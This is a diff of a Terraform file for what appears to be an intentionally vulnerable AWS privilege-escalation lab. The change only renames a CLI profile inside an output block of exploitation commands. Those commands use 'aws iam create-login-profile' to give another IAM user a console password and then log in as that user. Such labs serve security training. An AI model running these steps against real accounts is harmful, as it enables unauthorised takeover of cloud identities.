@@ -91,14 +91,14 @@ output "exploitation_commands" {
   description = "Example commands to exploit this vulnerability"
   value       = <<-EOT
     # Step 1: Verify starting user identity
-    aws sts get-caller-identity --profile pathfinder-prod-clp-bucket-starting-user
+    aws sts get-caller-identity --profile pathfinding-prod-clp-bucket-starting-user
 
     # Step 2: Create a console password for the hop1 user
     aws iam create-login-profile \
       --user-name ${aws_iam_user.hop1_user.name} \
       --password 'YourSecurePassword123!' \
       --no-password-reset-required \
-      --profile pathfinder-prod-clp-bucket-starting-user
+      --profile pathfinding-prod-clp-bucket-starting-user
 
     # Step 3: Log into AWS Console
     # Username: ${aws_iam_user.hop1_user.name}
